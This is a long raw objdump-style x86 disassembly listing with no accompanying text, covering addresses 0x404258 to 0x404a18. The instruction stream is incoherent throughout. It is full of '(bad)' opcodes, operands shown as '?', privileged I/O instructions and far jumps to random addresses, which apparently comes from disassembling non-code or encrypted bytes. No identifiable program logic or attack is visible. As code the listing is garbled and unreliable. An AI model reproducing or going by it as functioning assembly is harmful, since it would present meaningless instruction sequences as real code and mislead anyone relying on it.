  404258:	adc    DWORD PTR [edx+0x1a],0xf0a26818
  40425f:	mov    DWORD PTR [ecx],esi
  404261:	sti    
  404262:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404263:	inc    ebx
  404265:	push   ss
  404266:	in     al,dx
  404267:	mov    al,0x67
  404269:	(bad)  
  40426a:	mov    bh,0x18
  40426c:	sbb    BYTE PTR [esi+0x54],ah
  40426f:	xor    eax,0xff219319
  404274:	test   eax,0xb28bd015
  404279:	ins    BYTE PTR es:[edi],dx
  40427a:	mov    ebp,0x7c06c338
  40427f:	int    0xbf
  404281:	and    dh,ch
  404283:	sbb    dl,BYTE PTR [edi+0x6bd7618f]
  404289:	adc    al,0x62
  40428b:	inc    ebp
  40428c:	inc    esi
  40428d:	sbb    DWORD PTR [esi+0x1b],ebp
  404290:	ror    DWORD PTR [edx-0x2bc4b452],1
  404296:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404297:	callw  0xfde5
  40429b:	and    eax,0x1253d3a1
  4042a0:	daa    
  4042a1:	fmul   DWORD PTR [eax]
  4042a3:	sub    ecx,ecx
  4042a5:	pop    edi
  4042a6:	(bad)  
  4042a7:	not    DWORD PTR [ebx+eiz*8+0x3efc25f5]
  4042ae:	push   DWORD PTR [ebp-0x2d]
  4042b1:	(bad)  
  4042b2:	repnz mov ah,0x2e
  4042b5:	mov    bh,0xca
  4042b7:	cmp    eax,0x1c7f2379
  4042bc:	xchg   esi,eax
  4042bd:	mov    ch,0xb3
  4042bf:	jl     0x404315
  4042c1:	pop    ss
  4042c2:	push   ebx
  4042c3:	adc    ebp,ebx
  4042c5:	mov    al,ds:0x3c8c5ea9
  4042ca:	mov    ebp,0xf4742f9f
  4042cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042d0:	call   DWORD PTR [ebp+0x4e]
  4042d3:	pop    ebx
  4042d4:	cmp    BYTE PTR [eax],0x6d
  4042d7:	sbb    DWORD PTR [eax+ebp*4+0x5de5173a],ebp
  4042de:	mov    ah,BYTE PTR [edx-0x144ed948]
  4042e4:	popa   
  4042e5:	call   0x63ae:0x50fcdbf6
  4042ec:	and    bh,dl
  4042ee:	inc    eax
  4042ef:	jge    0x4042c5
  4042f1:	mov    ebx,0xea8422f4
  4042f6:	popa   
  4042f7:	sbb    bh,BYTE PTR [ebx]
  4042f9:	mov    bh,0x9a
  4042fb:	fldcw  WORD PTR [ebx-0x7b]
  4042fe:	fdivr  QWORD PTR [ecx]
  404300:	and    BYTE PTR [edi+esi*1],bh
  404303:	pop    DWORD PTR [edx-0x41]
  404306:	cmc    
  404307:	add    eax,0x7942da82
  40430c:	scas   al,BYTE PTR es:[edi]
  40430d:	retf   
  40430e:	je     0x4042a2
  404310:	xor    esp,edx
  404312:	adc    dh,BYTE PTR [ebx+0x363fe72e]
  404318:	push   edi
  404319:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40431a:	mov    ecx,0xec7e2823
  40431f:	(bad)  
  404320:	fld    TBYTE PTR [ebx]
  404322:	js     0x4042ed
  404324:	push   ds
  404325:	and    BYTE PTR [ebx+0x54138a46],dl
  40432b:	in     al,dx
  40432c:	scas   al,BYTE PTR es:[edi]
  40432d:	(bad)  
  40432e:	sub    eax,0x626ce1c0
  404333:	xor    esi,DWORD PTR es:[edi]
  404336:	popa   
  404337:	ja     0x4042e7
  404339:	adc    edi,DWORD PTR [esi-0x46b90d32]
  40433f:	adc    bh,BYTE PTR [esi+0x2b]
  404342:	test   al,0xe0
  404344:	popa   
  404345:	jmp    0xc1b455f4
  40434a:	or     eax,ecx
  40434c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40434d:	fisub  DWORD PTR [ebx]
  40434f:	imul   ebx,DWORD PTR [eax-0x14abb3fe],0x51a2174f
  404359:	pop    esp
  40435a:	add    eax,DWORD PTR [eax+0x58]
  40435d:	fbld   TBYTE PTR [ecx-0x6e]
  404360:	mov    WORD PTR [eax-0x3a28ba24],?
  404366:	int    0x83
  404368:	mov    esp,0xbc9f219
  40436d:	jg     0x404370
  40436f:	xchg   ecx,eax
  404370:	nop
  404371:	jae    0x4043ee
  404373:	xor    eax,0xe4c7fb60
  404378:	or     al,0x4
  40437a:	and    al,0x98
  40437c:	scas   eax,DWORD PTR es:[edi]
  40437d:	xor    edx,esi
  40437f:	aas    
  404380:	in     eax,dx
  404381:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404382:	pop    DWORD PTR [eax+0x24]
  404385:	push   edx
  404386:	or     ebp,DWORD PTR fs:[edi+esi*4]
  40438a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40438b:	dec    eax
  40438c:	in     al,0x6a
  40438e:	xchg   ecx,eax
  40438f:	in     eax,0xb4
  404391:	adc    esi,DWORD PTR [esi]
  404393:	(bad)  
  404394:	pop    ss
  404395:	lea    edx,[ebx]
  404397:	outs   dx,BYTE PTR ds:[esi]
  404398:	les    edx,FWORD PTR [ecx+esi*1]
  40439b:	neg    BYTE PTR [edi-0x3bba4b55]
  4043a1:	es inc esi
  4043a3:	retf   
  4043a4:	out    dx,al
  4043a5:	dec    al
  4043a7:	jne    0x404427
  4043a9:	outs   dx,DWORD PTR ds:[esi]
  4043aa:	jo     0x404408
  4043ac:	fst    DWORD PTR [esi]
  4043ae:	jmp    0x4043cf
  4043b0:	add    ebx,0x7c8b72fb
  4043b6:	mov    ds:0x7b88cbff,eax
  4043bb:	or     esp,DWORD PTR [eax+ecx*1+0x11]
  4043bf:	xor    ebp,edx
  4043c1:	and    BYTE PTR [edi-0x744c7d2d],bl
  4043c7:	pusha  
  4043c8:	sub    esi,ebp
  4043ca:	inc    ebx
  4043cb:	repz dec eax
  4043cd:	shr    BYTE PTR [eax-0x7f0d6264],1
  4043d3:	jnp    0x40437c
  4043d5:	and    DWORD PTR [ecx-0x2d6da5b2],esi
  4043db:	xor    al,0xbf
  4043dd:	dec    esp
  4043de:	(bad)  
  4043df:	sbb    esp,DWORD PTR [eax-0x38e41083]
  4043e5:	mov    ebp,0x34af6c41
  4043ea:	mov    eax,0xc7358efc
  4043ef:	sar    BYTE PTR [edx+eax*1],1
  4043f2:	inc    eax
  4043f3:	call   FWORD PTR [ebx-0x79bcd93]
  4043f9:	adc    bl,ch
  4043fb:	stos   WORD PTR es:[edi],ax
  4043fd:	dec    BYTE PTR [eax+0x3589d60]
  404403:	gs mov cl,0x38
  404406:	adc    dh,bh
  404408:	ss xor ebp,edi
  40440b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40440c:	xchg   DWORD PTR [esi-0x4a],edx
  40440f:	sbb    edi,DWORD PTR [ebx-0x2556baa9]
  404415:	lea    ebx,[edi-0x21]
  404418:	push   ds
  404419:	and    cl,BYTE PTR [eax+eiz*8+0x6e]
  40441d:	adc    ah,BYTE PTR [ecx]
  40441f:	out    dx,al
  404420:	cmc    
  404421:	push   esi
  404422:	scas   eax,DWORD PTR es:[edi]
  404423:	xlat   BYTE PTR ds:[ebx]
  404424:	push   ebx
  404425:	in     eax,0xf7
  404427:	xchg   ecx,eax
  404428:	xor    al,0x9f
  40442a:	cmc    
  40442b:	outs   dx,DWORD PTR ds:[esi]
  40442c:	test   BYTE PTR [ecx-0x59],0x86
  404430:	or     dh,BYTE PTR [ebx+0x70]
  404433:	hlt    
  404434:	fadd   DWORD PTR [eax+0x59f67d12]
  40443a:	in     eax,0x5f
  40443c:	test   BYTE PTR [esi+ecx*4],al
  40443f:	push   edx
  404440:	push   edi
  404441:	mov    dl,0x6
  404443:	aad    0x2c
  404445:	mov    cl,0x29
  404447:	add    DWORD PTR [ecx-0x2b],eax
  40444a:	push   ebx
  40444b:	ror    BYTE PTR [edx+esi*4-0x45955d52],0xf3
  404453:	repz fiadd WORD PTR [ebp-0x8]
  404457:	std    
  404458:	ficomp WORD PTR [edi+0x70]
  40445b:	out    0x15,al
  40445d:	sub    al,0xd
  40445f:	ins    DWORD PTR es:[edi],dx
  404460:	push   eax
  404461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404462:	lahf   
  404463:	dec    edx
  404464:	cwde   
  404465:	icebp  
  404466:	jb     0x404443
  404468:	test   al,0x3
  40446a:	ja     0x404462
  40446c:	cwde   
  40446d:	test   DWORD PTR [ecx],edi
  40446f:	sub    BYTE PTR [ecx-0x4707ff87],ch
  404475:	mov    dl,BYTE PTR ds:0xa9ef1bdb
  40447b:	mov    cs,esi
  40447d:	push   ecx
  40447e:	(bad)  
  40447f:	push   edx
  404480:	cdq    
  404481:	sub    eax,0xd5b62a7b
  404486:	leave  
  404487:	js     0x404493
  404489:	lock fdivr st,st(1)
  40448c:	jo     0x404451
  40448e:	bound  ecx,QWORD PTR [ecx-0x53d346f]
  404494:	ss sub eax,0xd4f69c7f
  40449a:	inc    esi
  40449b:	aad    0x4
  40449d:	sub    eax,0xc3add8b3
  4044a2:	jb     0x404461
  4044a4:	sub    al,0x89
  4044a6:	xchg   edi,eax
  4044a7:	or     edi,esp
  4044a9:	outs   dx,BYTE PTR ds:[esi]
  4044aa:	cwde   
  4044ab:	pop    esp
  4044ac:	fwait
  4044ad:	call   DWORD PTR [esi+0x77]
  4044b0:	sbb    BYTE PTR [ecx-0x30],0x68
  4044b4:	jecxz  0x404461
  4044b6:	push   edx
  4044b7:	or     al,bh
  4044b9:	push   edi
  4044ba:	clc    
  4044bb:	xchg   ecx,eax
  4044bc:	or     cl,BYTE PTR ds:0x4591880b
  4044c2:	fcom   QWORD PTR [ebx]
  4044c4:	fisttp DWORD PTR [ebx]
  4044c6:	push   0x5
  4044c8:	mov    ebx,0xb91cdb0d
  4044cd:	mov    al,ds:0xcd8fdc11
  4044d2:	scas   eax,DWORD PTR es:[edi]
  4044d3:	enter  0xfbf7,0xe4
  4044d7:	adc    eax,0x1c3b4547
  4044dc:	fnstcw WORD PTR [esi+0x729b7c49]
  4044e2:	xchg   esp,eax
  4044e3:	je     0x40446d
  4044e5:	call   0xd117:0xed4a1be0
  4044ec:	push   es
  4044ed:	cli    
  4044ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044ef:	mov    bh,0x2d
  4044f1:	mov    ?,WORD PTR [ebp+0x6b]
  4044f4:	or     ecx,esp
  4044f6:	iret   
  4044f7:	sahf   
  4044f8:	ss cmp eax,0x55b6e89c
  4044fe:	jns    0x4044d7
  404500:	sub    al,al
  404502:	pop    edi
  404503:	or     al,0x16
  404505:	push   esp
  404506:	(bad)
  404509:	fnclex 
  40450b:	mov    ecx,esi
  40450d:	imul   ebx,DWORD PTR [ebx],0x42
  404510:	je     0x4044ee
  404512:	mov    bh,0x72
  404514:	retf   
  404515:	jbe    0x40453d
  404517:	mov    al,0xa4
  404519:	ss pop edi
  40451b:	outs   dx,BYTE PTR ds:[esi]
  40451c:	ja     0x4044bf
  40451e:	xchg   ebx,eax
  40451f:	int3   
  404520:	mov    ebp,0xd22384a9
  404525:	nop
  404526:	ja     0x40451a
  404528:	inc    ecx
  404529:	in     eax,dx
  40452a:	int    0x45
  40452c:	clc    
  40452d:	mov    esp,edx
  40452f:	lahf   
  404530:	cmp    ah,al
  404532:	sub    BYTE PTR [ebx-0x3e],bl
  404535:	xor    eax,0x42d50ab3
  40453a:	into   
  40453b:	pop    ss
  40453c:	and    al,0x88
  40453e:	xlat   BYTE PTR ds:[ebx]
  40453f:	mov    cl,0xfa
  404541:	lahf   
  404542:	jno    0x404555
  404544:	fadd   DWORD PTR [edi]
  404546:	jb     0x404530
  404548:	rol    BYTE PTR [ecx],1
  40454a:	push   ecx
  40454b:	in     al,0x4c
  40454d:	mov    cl,0x84
  40454f:	add    ah,BYTE PTR [ebx+0x3c]
  404552:	inc    eax
  404553:	cli    
  404554:	dec    esi
  404555:	ficom  DWORD PTR [eax+0x49f9f766]
  40455b:	aas    
  40455c:	pop    ss
  40455d:	cmp    ch,bh
  40455f:	mul    DWORD PTR [edx+0x1ba2984a]
  404565:	mov    eax,ds:0xef49886d
  40456a:	mov    edx,0x4be679d2
  40456f:	fcos   
  404571:	mov    ds:0xa334a5fd,eax
  404576:	or     BYTE PTR [esp+eiz*4-0x3cf2b9fe],ch
  40457d:	bound  eax,QWORD PTR [edx-0x4a0850ce]
  404583:	xor    BYTE PTR [ecx],0xb8
  404586:	dec    edi
  404587:	push   ss
  404588:	cld    
  404589:	or     bl,cl
  40458b:	ret    
  40458c:	or     al,0x77
  40458e:	les    esi,FWORD PTR [edx-0x6c]
  404591:	les    esi,FWORD PTR [edx+0x77e59b2c]
  404597:	xchg   esp,eax
  404598:	dec    edi
  404599:	aas    
  40459a:	lock xor esi,DWORD PTR [edx-0x75]
  40459e:	sub    eax,0xb6818501
  4045a3:	sbb    al,0x22
  4045a5:	fistp  QWORD PTR [esp+eiz*2+0x59]
  4045a9:	jecxz  0x4045d0
  4045ab:	es (bad) 
  4045ad:	pusha  
  4045ae:	lds    ebp,FWORD PTR [eax-0x69b09d4b]
  4045b4:	push   0x4a9924ac
  4045b9:	pop    ebp
  4045ba:	jg     0x4045bf
  4045bc:	popf   
  4045bd:	mov    bh,0x45
  4045bf:	mov    dl,0x37
  4045c1:	xlat   BYTE PTR ds:[ebx]
  4045c2:	sub    al,0xfd
  4045c4:	and    DWORD PTR [ebx],0xf858b203
  4045ca:	sbb    al,0x19
  4045cc:	das    
  4045cd:	xchg   BYTE PTR [esi],bh
  4045cf:	inc    eax
  4045d0:	std    
  4045d1:	int3   
  4045d2:	popf   
  4045d3:	and    DWORD PTR [edx+0x392194ee],edi
  4045d9:	not    BYTE PTR [esi+edx*8+0x23]
  4045dd:	add    bl,dh
  4045df:	aam    0xa4
  4045e1:	lock lahf 
  4045e3:	retf   0x272c
  4045e6:	sbb    DWORD PTR [esi+0x68],edi
  4045e9:	sbb    bh,cl
  4045eb:	xor    DWORD PTR [ecx-0x39],esp
  4045ee:	and    ebx,ebp
  4045f0:	adc    DWORD PTR ds:0xcab5aa12,0x45ba957
  4045fa:	nop
  4045fb:	sar    DWORD PTR [eax-0x53],0xc2
  4045ff:	mov    fs,WORD PTR [ecx]
  404601:	test   DWORD PTR [ebx],ebp
  404603:	xor    eax,0xce21505a
  404608:	jmp    0x8d31aba2
  40460d:	sbb    edx,edi
  40460f:	mov    al,0x44
  404611:	push   es
  404612:	xchg   esi,eax
  404613:	scas   eax,DWORD PTR es:[edi]
  404614:	aas    
  404615:	add    BYTE PTR [edx],ah
  404617:	and    eax,0x1ac20f3
  40461c:	in     al,0x59
  40461e:	xor    al,0x92
  404620:	pop    edx
  404621:	leave  
  404622:	dec    esi
  404623:	cli    
  404624:	lea    ecx,[ecx-0x71]
  404627:	xchg   esp,eax
  404628:	add    bl,BYTE PTR [eax]
  40462a:	int3   
  40462b:	inc    ebp
  40462c:	fisubr DWORD PTR [ecx+0x74]
  40462f:	sbb    BYTE PTR [ebp-0x2116f96e],ah
  404635:	jg     0x404604
  404637:	jecxz  0x4046a6
  404639:	fld    TBYTE PTR fs:[esi+eiz*1-0x6fda1cb4]
  404641:	ja     0x404672
  404643:	loope  0x40461a
  404645:	xor    cl,BYTE PTR [edi+0x2d]
  404648:	add    al,0x2
  40464a:	push   edx
  40464b:	add    al,BYTE PTR [esi+0x4c]
  40464e:	js     0x4045eb
  404650:	arpl   WORD PTR [edi],dx
  404652:	jecxz  0x4045e4
  404654:	push   esi
  404655:	fistp  QWORD PTR [edi-0x69]
  404658:	es and al,0x9f
  40465b:	sub    al,0x3f
  40465d:	sbb    BYTE PTR [ebp-0x10],ch
  404660:	push   cs
  404661:	sub    al,0xec
  404663:	rcr    DWORD PTR [eax+0x27],cl
  404666:	pop    ecx
  404667:	repz mov eax,ds:0x3de8e620
  40466d:	xchg   esp,eax
  40466e:	xor    eax,0x121610ea
  404673:	ret    0x7668
  404676:	aam    0x52
  404678:	(bad)  
  404679:	es (bad) 
  40467b:	loopne 0x404654
  40467d:	mov    ch,0x6f
  40467f:	push   ss
  404680:	inc    eax
  404681:	xchg   ebx,eax
  404682:	rcl    BYTE PTR [esi-0x1b5c603b],1
  404688:	fs jae 0x404618
  40468b:	xchg   ecx,eax
  40468c:	stos   DWORD PTR es:[edi],eax
  40468d:	int3   
  40468e:	add    eax,0x461a06c2
  404693:	lods   al,BYTE PTR ds:[esi]
  404694:	or     eax,0xa4939c76
  404699:	sti    
  40469a:	ins    DWORD PTR es:[edi],dx
  40469b:	and    al,0x17
  40469d:	mov    esi,0xbe11a83d
  4046a2:	ret    0xc4a5
  4046a5:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046a7:	imul   ebx,DWORD PTR [ebx],0xfffffff5
  4046aa:	inc    edi
  4046ab:	or     BYTE PTR [ecx],bh
  4046ad:	push   0xffffffe2
  4046af:	add    dl,BYTE PTR [edx-0x69]
  4046b2:	test   eax,0x87fba8eb
  4046b7:	fwait
  4046b8:	push   esi
  4046b9:	and    eax,0xd6a50a8
  4046be:	mov    fs:0xc99c8cf6,al
  4046c4:	out    0x9b,eax
  4046c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046c7:	jne    0x4046e3
  4046c9:	or     al,0xc7
  4046cb:	(bad)  
  4046cc:	out    0xb7,eax
  4046ce:	call   0xf90f8312
  4046d3:	fucom  st(4)
  4046d5:	ds xchg ebx,eax
  4046d7:	xor    ebx,DWORD PTR [edi]
  4046d9:	repz scas eax,DWORD PTR es:[edi]
  4046db:	push   esi
  4046dc:	inc    edx
  4046dd:	loope  0x404702
  4046df:	js     0x404737
  4046e1:	cdq    
  4046e2:	cli    
  4046e3:	add    edx,0x29
  4046e6:	aam    0x72
  4046e8:	sbb    eax,DWORD PTR [eax+eax*1-0x1acbee2f]
  4046ef:	pop    edx
  4046f0:	pop    eax
  4046f1:	add    al,0x3d
  4046f3:	xchg   esp,eax
  4046f4:	fwait
  4046f5:	retf   0xd0e8
  4046f8:	jnp    0x404711
  4046fa:	hlt    
  4046fb:	lahf   
  4046fc:	retf   0x3380
  4046ff:	dec    eax
  404700:	retf   
  404701:	fst    st(4)
  404703:	lea    edi,[esi+0x2fc4188a]
  404709:	sub    dh,BYTE PTR [edx-0x2aabac52]
  40470f:	ror    DWORD PTR [ebp-0x1c],0x7c
  404713:	shl    DWORD PTR [edx+0x2bc2986a],cl
  404719:	mov    eax,ds:0x81360d28
  40471e:	jmp    0x8a3f:0x48a0d80c
  404725:	ret    
  404726:	(bad)  
  404727:	popf   
  404728:	lods   al,BYTE PTR ds:[esi]
  404729:	aad    0x9a
  40472b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40472c:	sub    dl,0x5c
  40472f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404730:	jl     0x4046f7
  404732:	or     BYTE PTR [eax+0x7dcea133],ch
  404738:	pop    eax
  404739:	outs   dx,DWORD PTR ds:[esi]
  40473a:	jmp    0x6e29:0xfab262be
  404741:	out    0x96,al
  404743:	retf   0x166c
  404746:	mov    ecx,0x68888a29
  40474b:	inc    edi
  40474c:	mov    DWORD PTR [esi],edx
  40474e:	fs sub al,0xa2
  404751:	pop    ds
  404752:	out    dx,al
  404753:	jecxz  0x40477e
  404755:	js     0x404790
  404757:	bound  edx,QWORD PTR [esi]
  404759:	loope  0x4047b6
  40475b:	xchg   ebp,eax
  40475c:	in     eax,0xdc
  40475e:	fs ins BYTE PTR es:[edi],dx
  404760:	(bad)  
  404761:	xchg   esi,eax
  404762:	fadd   DWORD PTR [esi-0x2f52b948]
  404768:	cmp    al,0xae
  40476a:	push   ebx
  40476b:	jo     0x4047da
  40476d:	sbb    edi,ebp
  40476f:	test   al,0xc
  404771:	push   ss
  404772:	arpl   WORD PTR [ebx-0x3f],dx
  404775:	push   0xffffffe5
  404777:	push   0xffffff93
  404779:	cmp    eax,0xe2d80cb0
  40477e:	imul   BYTE PTR [bx+si-0x4b]
  404782:	stos   DWORD PTR es:[edi],eax
  404783:	adc    DWORD PTR [edx-0x6c266fcb],0x47
  40478a:	sbb    al,ch
  40478c:	sahf   
  40478d:	cld    
  40478e:	lds    edx,FWORD PTR [ebx-0x620321fa]
  404794:	pushf  
  404795:	les    edx,FWORD PTR [edx]
  404797:	test   BYTE PTR [edx-0x41],bh
  40479a:	(bad)  
  40479b:	mov    bl,0xd9
  40479d:	push   edi
  40479e:	mov    eax,ds:0xfa35f579
  4047a3:	xchg   esi,eax
  4047a5:	scas   ax,WORD PTR es:[edi]
  4047a7:	mov    BYTE PTR [eax+0x4571ddc1],ch
  4047ad:	push   esi
  4047ae:	sti    
  4047af:	and    edi,DWORD PTR [eax]
  4047b1:	cld    
  4047b2:	pop    ds
  4047b3:	cld    
  4047b4:	mov    eax,0xb63d205c
  4047b9:	adc    edi,eax
  4047bb:	inc    esp
  4047bc:	enter  0xb648,0xea
  4047c0:	sbb    DWORD PTR [ecx],0xf4c503b7
  4047c6:	mov    esp,edx
  4047c8:	dec    esp
  4047c9:	ficomp DWORD PTR ds:[edx+0xb53b180]
  4047d0:	xor    al,0x63
  4047d2:	ror    BYTE PTR fs:[ecx],cl
  4047d5:	repnz mov WORD PTR [edi+0x7],?
  4047d9:	mov    ds:0xf3aea955,al
  4047de:	mov    ds:0x3bf42454,eax
  4047e3:	add    eax,0x81a91cee
  4047e8:	mov    BYTE PTR [edi],dl
  4047ea:	pop    edx
  4047eb:	sbb    ecx,ecx
  4047ed:	jnp    0x4047fd
  4047ef:	popf   
  4047f0:	cmp    eax,0xe5ec7f22
  4047f5:	push   ds
  4047f6:	stos   BYTE PTR es:[edi],al
  4047f7:	jmp    0x4047f7
  4047f9:	dec    esp
  4047fa:	scas   al,BYTE PTR es:[edi]
  4047fb:	mov    bl,BYTE PTR [ebx+0x66]
  4047fe:	stos   DWORD PTR es:[edi],eax
  4047ff:	mov    esi,esp
  404801:	or     BYTE PTR [eax+0x7c],bl
  404804:	lods   al,BYTE PTR ds:[esi]
  404805:	pop    eax
  404806:	test   BYTE PTR [esi+eax*8],al
  404809:	mov    bl,BYTE PTR [ecx+0x57a0a346]
  40480f:	loop   0x404866
  404811:	dec    ecx
  404812:	xchg   ebp,eax
  404813:	ret    
  404814:	cld    
  404815:	daa    
  404816:	stos   BYTE PTR es:[edi],al
  404817:	dec    edx
  404818:	cld    
  404819:	pop    edx
  40481a:	mov    ss,WORD PTR [esi-0x62]
  40481d:	mov    ecx,0x5f349659
  404822:	xchg   ecx,eax
  404823:	jp     0x4047ac
  404825:	ins    DWORD PTR es:[edi],dx
  404826:	in     al,0x29
  404828:	gs dec edx
  40482a:	fwait
  40482b:	js     0x40488c
  40482d:	imul   ecx,DWORD PTR [edi],0x40858dd6
  404833:	pusha  
  404834:	jecxz  0x4047e1
  404836:	mov    ds:0xf53f85ff,al
  40483b:	shr    DWORD PTR [edx],0x39
  40483e:	mov    DWORD PTR [ecx-0x2d],esp
  404841:	fsubr  DWORD PTR [edx]
  404843:	arpl   WORD PTR [esp+edi*1-0xe],ax
  404847:	inc    edx
  404848:	mov    ebx,0xb8a01d5c
  40484d:	or     DWORD PTR [edi-0x4532e272],ebx
  404853:	rcr    BYTE PTR [ebp+0x2d],1
  404856:	pop    ebp
  404857:	dec    ebx
  404858:	and    eax,0xec0b15a3
  40485d:	inc    eax
  40485e:	imul   edx,edi,0x7b7ff02f
  404864:	cdq    
  404865:	or     dl,BYTE PTR [esi+0x4d885f3]
  40486b:	sub    al,0xf3
  40486d:	or     al,0x79
  40486f:	mov    DWORD PTR [ecx],ebx
  404871:	mov    ebp,0x1e8aaf51
  404876:	aam    0xb
  404878:	push   ds
  404879:	add    eax,0xdfc9fb5a
  40487e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40487f:	and    BYTE PTR [esi-0x69],bl
  404882:	sub    BYTE PTR [ebx-0x10],dl
  404885:	(bad)  
  404886:	fldenv ds:[esi]
  404889:	sub    esp,DWORD PTR [ebp-0x76]
  40488c:	xchg   ecx,eax
  40488d:	(bad)  
  40488e:	imul   DWORD PTR [ecx+0x51]
  404891:	adc    dh,BYTE PTR [eax]
  404893:	cmp    ebx,DWORD PTR [eax]
  404895:	xor    eax,0x25d9889a
  40489a:	push   esi
  40489b:	cli    
  40489c:	fist   WORD PTR [ecx+0x591005ac]
  4048a2:	xchg   BYTE PTR [ebx-0x52],ah
  4048a5:	cdq    
  4048a6:	cmc    
  4048a7:	jg     0x4048c4
  4048a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048aa:	cmp    BYTE PTR [ebx-0x1a8fd4d0],0x20
  4048b1:	loop   0x4048f5
  4048b3:	sbb    edx,edx
  4048b5:	test   eax,0x47d9c69f
  4048ba:	imul   esp,DWORD PTR [eax],0xffffffa5
  4048bd:	pop    ebx
  4048be:	(bad)  
  4048bf:	fisub  DWORD PTR [eax+0x50]
  4048c2:	and    edx,DWORD PTR [esi-0x3]
  4048c5:	push   esp
  4048c6:	push   eax
  4048c7:	xchg   edx,eax
  4048c8:	mov    al,0x97
  4048ca:	lahf   
  4048cb:	sbb    ah,BYTE PTR [ecx-0xdfac259]
  4048d1:	dec    eax
  4048d2:	mov    DWORD PTR [ecx+0x20962b97],ecx
  4048d8:	jns    0x4048de
  4048da:	pop    edi
  4048db:	mov    edx,0xa94f9c82
  4048e0:	rcl    BYTE PTR [ebx],cl
  4048e2:	(bad)  
  4048e4:	dec    ax
  4048e6:	nop
  4048e7:	ficom  WORD PTR [edi+0x4d]
  4048ea:	std    
  4048eb:	in     al,dx
  4048ec:	imul   esi,DWORD PTR [ebx-0x3e],0xffffff9c
  4048f0:	pop    ebx
  4048f1:	pop    ss
  4048f2:	mov    dh,0xf0
  4048f4:	sti    
  4048f5:	dec    ecx
  4048f6:	std    
  4048f7:	lahf   
  4048f8:	je     0x4048ab
  4048fa:	xor    al,0x88
  4048fc:	push   ds
  4048fd:	mov    DWORD PTR [ecx+0x2e],esp
  404900:	push   ds
  404901:	sbb    eax,0x794c5f9
  404906:	sbb    bl,dl
  404908:	mov    dl,BYTE PTR [edi-0x7bb84c9a]
  40490e:	fwait
  40490f:	aas    
  404910:	clc    
  404911:	sbb    eax,0xbcef5d5c
  404916:	inc    edi
  404917:	dec    esi
  404918:	nop
  404919:	lock (bad) 
  40491b:	mov    eax,0x184bcfd7
  404920:	dec    eax
  404921:	xchg   esi,eax
  404922:	mov    edi,0x1e48487a
  404927:	call   0x750:0x754f6c5c
  40492e:	call   0x20f7:0xb9874a4a
  404935:	or     al,0x64
  404937:	jp     0x404974
  404939:	or     BYTE PTR [edi],0x8c
  40493c:	jns    0x404905
  40493e:	mov    ebx,0x29caaadf
  404943:	sub    eax,edi
  404945:	push   ss
  404946:	fldlg2 
  404948:	cwde   
  404949:	cld    
  40494a:	mov    bh,0xe
  40494c:	ins    BYTE PTR es:[edi],dx
  40494d:	dec    edi
  40494e:	adc    eax,DWORD PTR [edx+0x47]
  404951:	pop    es
  404952:	ss add bh,dl
  404955:	ins    BYTE PTR es:[edi],dx
  404956:	dec    ebp
  404957:	(bad)  
  404959:	mov    ebp,0x1b3c78f6
  40495e:	mov    esi,0x17a3eef5
  404963:	rol    BYTE PTR [ecx],0xc8
  404966:	jmp    0xc0bb3cb2
  40496b:	or     al,0x88
  40496d:	mov    edi,0xdb1f776d
  404972:	sbb    al,0x5f
  404974:	mov    bl,0x68
  404976:	lea    ecx,[ebp+0x2d46a5e2]
  40497c:	xlat   BYTE PTR ds:[ebx]
  40497d:	pop    ebx
  40497e:	(bad)  
  40497f:	jmp    0xa1c99a31
  404984:	jae    0x4049eb
  404986:	sbb    ecx,DWORD PTR [ecx]
  404988:	pop    ebp
  404989:	dec    ecx
  40498a:	pop    ds
  40498b:	jae    0x4049f4
  40498d:	adc    eax,0xe3726802
  404992:	or     al,0x90
  404994:	ins    DWORD PTR es:[edi],dx
  404995:	bound  esi,QWORD PTR [ebp-0x6f]
  404998:	fstp   st(2)
  40499a:	dec    esp
  40499b:	std    
  40499c:	std    
  40499d:	clc    
  40499e:	fwait
  40499f:	xchg   edx,eax
  4049a0:	aad    0x3
  4049a2:	push   cs
  4049a3:	inc    eax
  4049a4:	mov    dl,0xec
  4049a6:	mov    bh,0xaa
  4049a8:	aad    0x81
  4049aa:	mov    ecx,0x36d2ec9f
  4049af:	pop    esi
  4049b0:	call   0xfa1d87e4
  4049b5:	fldcw  WORD PTR [eax]
  4049b7:	xor    eax,0xb7e72a0b
  4049bc:	mov    esp,0x2195bce7
  4049c1:	out    0xc1,eax
  4049c3:	xchg   esi,eax
  4049c4:	popf   
  4049c5:	fstp   QWORD PTR [ecx+0x3361f3ea]
  4049cb:	ds sub al,0xb5
  4049ce:	aam    0xe3
  4049d0:	xor    bl,0x89
  4049d3:	imul   eax,DWORD PTR [ecx],0xaf8f30f6
  4049d9:	mov    ah,0xab
  4049db:	pusha  
  4049dc:	and    dh,BYTE PTR [esi+0x0]
  4049df:	loopne 0x4049b3
  4049e1:	cmovns eax,esi
  4049e4:	sub    DWORD PTR [ebx],ecx
  4049e6:	es xor ah,bl
  4049e9:	mov    edi,0x6f1cb551
  4049ee:	adc    ebp,DWORD PTR [esp+esi*1-0x138b77f1]
  4049f5:	rol    BYTE PTR es:[ecx+0x15ec41b7],cl
  4049fc:	jecxz  0x404a4a
  4049fe:	jecxz  0x4049ea
  404a00:	js     0x404a3e
  404a02:	inc    ebx
  404a03:	jle    0x4049ca
  404a05:	cmp    BYTE PTR [edx+eiz*2],ch
  404a08:	push   es
  404a09:	mov    al,ds:0x8f4a8158
  404a0e:	cmp    BYTE PTR [edi+0x727e530],dl
  404a14:	mov    dl,0x93
  404a16:	jecxz  0x4049c0
  404a18:	pop    eax
